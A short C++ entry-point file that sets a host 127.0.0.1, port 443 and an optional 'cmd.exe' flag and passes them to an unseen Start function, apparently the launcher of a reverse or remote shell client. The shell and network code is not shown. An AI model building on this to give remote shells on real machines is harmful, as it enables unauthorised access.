#include "header.h"
#include <iostream>
#include <string>

int main(int argc, char* argv[]) {
    std::string ip = "127.0.0.1";
    std::string port = "443";
    bool useCmd = false;

    /*if (argc >= 2) ip = argv[1];
    if (argc >= 3) port = argv[2];
    if (argc >= 4 && strcmp(argv[3], "cmd.exe") == 0)
        useCmd = true;
    */

    Start(ip, port, useCmd);

    return 0;
}
